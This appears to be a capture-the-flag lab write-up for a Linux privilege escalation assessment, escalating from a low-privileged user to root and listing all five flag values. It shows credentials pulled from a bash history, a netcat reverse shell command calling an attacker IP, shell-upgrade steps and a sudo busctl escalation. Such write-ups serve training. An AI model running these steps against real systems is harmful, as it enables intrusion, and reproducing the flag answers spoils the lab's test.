# Skills Assessment

We have been contracted to perform a security hardening assessment against one of the `INLANEFREIGHT` organizations' public-facing web servers.

The client has provided us with a low privileged user to assess the security of the server. Connect via SSH and begin looking for misconfigurations and other flaws that may escalate privileges using the skills learned throughout this module.

Once on the host, we must find `five` flags on the host, accessible at various privilege levels. Escalate privileges all the way from the `htb-student` user to the `root` user and submit all five flags to finish this module.

Submit the contents of flag1.txt

```
htb-student@nix03:~$ history
    1  id
    2  ls
    3  ls /var/www/html
    4  cat /var/www/html/flag1.txt 
    5  exit
```

<figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption><p>LLPE{d0n_ov3rl00k_h1dden_f1les!}</p></figcaption></figure>

Submit the contents of flag2.txt

<figure><img src="../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

```sh
htb-student@nix03:/home/barry$ ls -al
total 40
drwxr-xr-x 5 barry barry 4096 Sep  5  2020 .
drwxr-xr-x 5 root  root  4096 Sep  6  2020 ..
-rwxr-xr-x 1 barry barry  360 Sep  6  2020 .bash_history
-rw-r--r-- 1 barry barry  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 barry barry 3771 Feb 25  2020 .bashrc
drwx------ 2 barry barry 4096 Sep  5  2020 .cache
-rwx------ 1 barry barry   29 Sep  5  2020 flag2.txt
drwxrwxr-x 3 barry barry 4096 Sep  5  2020 .local
-rw-r--r-- 1 barry barry  807 Feb 25  2020 .profile
drwx------ 2 barry barry 4096 Sep  5  2020 .ssh
htb-student@nix03:/home/barry$ cat .bash_history 
cd /home/barry
ls
id
ssh-keygen
mysql -u root -p
tmux new -s barry
cd ~
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
history -d 6
history
history -d 12
history
cd /home/bash
cd /home/barry/
nano .bash_history 
history
exit
history
exit
ls -la
ls -l
history 
history -d 21
history 
exit
id
ls /var/log
history
history -d 28
history
exit
```

```sh
htb-student@nix03:/home/barry$ su - barry
Password: she
barry@nix03:~$ ls
flag2.txt
barry@nix03:~$ cat flag2.txt 
LLPE{ch3ck_th0se_cmd_l1nes!}
```

Submit the contents of flag3.txt

```
barry@nix03:/$ find / -type f -name "flag3.*" -exec ls -l {} \; 2>/dev/null
-rw-r----- 1 root adm 23 Sep  5  2020 /var/log/flag3.txt
barry@nix03:/$ cat /var/log/flag3.txt
LLPE{h3y_l00k_a_fl@g!}
```

Submit the contents of flag4.txt

```
barry@nix03:/$ find / -type f -name "flag4.*" -exec ls -l {} \; 2>/dev/null
-rw------- 1 tomcat tomcat 25 Sep  5  2020 /var/lib/tomcat9/flag4.txt
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption><p>T0mc@t_s3cret_p@ss!</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption><p>tomcat manager page</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (104).png" alt=""><figcaption><p>LLPE{im_th3_m@nag3r_n0w}</p></figcaption></figure>

Submit the contents of flag5.txt

* Get a reverse shell using the following command
  * `busybox nc 10.10.14.5 7890 -e sh`

> The current shell won't beable to run busutil fully since busutil needs a interactive shell to escalate the privilege.

<figure><img src="../../.gitbook/assets/image (106).png" alt=""><figcaption><p>Get the second shell </p></figcaption></figure>

Shell upgrade

1. `exec /bin/bash --login` (on Attack machine)
2. connect to the reverse shell from the target (nc listen and reverse shell payload)
3. `python3 -c 'import pty; pty.spawn("/bin/bash")'` (on Target machine)
4. background the process using `Ctrl+z` (on Attack machine)
5. `stty raw -echo; fg; reset` (on Attack machine)

After the shell is fully upgraded, run&#x20;

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://gtfobins.github.io/gtfobins/busctl/#sudo" %}

<figure><img src="../../.gitbook/assets/image (108).png" alt=""><figcaption><p>LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}</p></figcaption></figure>
